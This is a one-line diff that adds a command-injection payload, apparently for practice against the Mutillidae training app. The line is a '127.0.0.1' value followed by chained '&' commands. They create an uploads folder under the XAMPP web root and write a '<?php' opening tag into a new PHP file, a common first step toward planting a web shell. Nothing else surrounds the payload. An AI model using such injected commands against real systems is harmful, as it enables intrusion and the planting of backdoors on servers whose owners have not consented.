@@ -1,0 +1,1 @@
+127.0.0.1 & mkdir C:\xampp\htdocs\mutillidae\uploads & echo ^<?php > C:\xampp\htdocs\mutillidae\uploads\registro\formulario.php
